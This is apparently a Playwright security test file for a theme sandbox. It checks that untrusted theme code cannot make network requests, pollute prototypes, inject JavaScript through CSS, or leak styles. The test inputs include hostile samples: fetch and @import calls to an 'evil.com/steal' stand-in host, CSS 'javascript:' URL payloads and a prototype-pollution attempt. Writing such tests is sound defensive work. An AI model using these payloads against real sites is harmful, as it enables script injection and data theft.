import { expect, test } from '@playwright/test'

test.describe('Theme Sandbox: Network Isolation', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/', { waitUntil: 'domcontentloaded' })
  })

  test('Sandboxed iframe cannot make network requests', async ({ page }) => {
    const networkAttempted = await page.evaluate(() => {
      return new Promise(resolve => {
        let attempted = false
        const originalFetch = window.fetch
        window.fetch = async (...args) => {
          if (args[0]?.includes?.('evil.com')) {
            attempted = true
          }
          return originalFetch.apply(this, args)
        }

        const iframe = document.createElement('iframe')
        iframe.sandbox = 'allow-scripts'
        iframe.srcdoc = `
          <script>
            fetch('https://evil.com/steal')
              .then(() => parent.postMessage({type: 'network-success'}, '*'))
              .catch(() => parent.postMessage({type: 'network-failed'}, '*'))
          <\/script>
        `
        document.body.appendChild(iframe)

        setTimeout(() => {
          window.fetch = originalFetch
          resolve(attempted)
        }, 1000)
      })
    })

    expect(networkAttempted).toBeFalsy()
  })
})

test.describe('Theme Sandbox: Prototype Pollution Prevention', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/', { waitUntil: 'domcontentloaded' })
  })

  test('Prototype pollution is prevented in sandbox', async ({ page }) => {
    const pollutionResult = await page.evaluate(() => {
      const iframe = document.createElement('iframe')
      iframe.sandbox = 'allow-scripts'
      let result = { polluted: false, error: null }

      iframe.srcdoc = `
        <script>
          try {
            Object.prototype.__proto__.polluted = 'yes'
            parent.postMessage({type: 'pollution-success', polluted: {}.polluted}, '*')
          } catch (e) {
            parent.postMessage({type: 'pollution-failed', error: e.message}, '*')
          }
        <\/script>
      `
      document.body.appendChild(iframe)

      return new Promise(resolve => {
        window.addEventListener('message', (e) => {
          if (e.data.type === 'pollution-success' || e.data.type === 'pollution-failed') {
            resolve(e.data)
          }
        })
        setTimeout(() => resolve({polluted: false, error: 'timeout'}), 500)
      })
    })

    expect(pollutionResult.polluted).toBeFalsy()
  })
})

test.describe('Theme CSS: Injection Prevention', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/', { waitUntil: 'domcontentloaded' })
  })

  test('Theme CSS cannot inject JavaScript via url()', async ({ page }) => {
    const jsExecuted = await page.evaluate(() => {
      const style = document.createElement('style')
      style.textContent = `
        .test::before { content: url("javascript:alert(1)"); }
        .test2 { background: url("javascript:parent.postMessage({type:'css-injection'},'*')"); }
      `
      document.head.appendChild(style)

      return new Promise(resolve => {
        window.addEventListener('message', (e) => {
          if (e.data.type === 'css-injection') {
            resolve(true)
          }
        })
        setTimeout(() => resolve(false), 500)
      })
    })

    expect(jsExecuted).toBeFalsy()
  })

  test('Theme CSS cannot use expression() (IE legacy)', async ({ page }) => {
    const expressionWorks = await page.evaluate(() => {
      const style = document.createElement('style')
      style.textContent = `
        .test { width: expression(alert(1)); }
      `
      document.head.appendChild(style)

      return new Promise(resolve => {
        window.addEventListener('message', (e) => {
          if (e.data.type === 'expression-executed') {
            resolve(true)
          }
        })
        setTimeout(() => resolve(false), 500)
      })
    })

    expect(expressionWorks).toBeFalsy()
  })

  test('Theme CSS @import is restricted by CSP', async ({ page }) => {
    const importAttempted = await page.evaluate(() => {
      const style = document.createElement('style')
      style.textContent = `
        @import url("https://evil.com/steal.css");
      `
      document.head.appendChild(style)

      return new Promise(resolve => {
        const originalFetch = window.fetch
        let fetched = false
        window.fetch = async (...args) => {
          if (args[0]?.includes?.('evil.com')) {
            fetched = true
          }
          return originalFetch.apply(this, args)
        }

        setTimeout(() => {
          window.fetch = originalFetch
          resolve(fetched)
        }, 1000)
      })
    })

    expect(importAttempted).toBeFalsy()
  })
})

test.describe('Theme CSS: Style Isolation', () => {
  test.beforeEach(async ({ page }) => {
    await page.goto('/', { waitUntil: 'domcontentloaded' })
  })

  test('Theme CSS cannot access parent page styles', async ({ page }) => {
    const styleLeak = await page.evaluate(() => {
      const iframe = document.createElement('iframe')
      iframe.sandbox = 'allow-scripts'
      iframe.srcdoc = `
        <style>
          body { background: red !important; }
        </style>
        <script>
          const parentStyles = window.parent.getComputedStyle(document.body)
          parent.postMessage({type: 'style-leak', backgroundColor: parentStyles.backgroundColor}, '*')
        <\/script>
      `
      document.body.appendChild(iframe)

      return new Promise(resolve => {
        window.addEventListener('message', (e) => {
          if (e.data.type === 'style-leak') {
            resolve(e.data)
          }
        })
        setTimeout(() => resolve({backgroundColor: 'unknown'}), 500)
      })
    })

    expect(styleLeak.backgroundColor).not.toBe('rgb(255, 0, 0)')
  })
})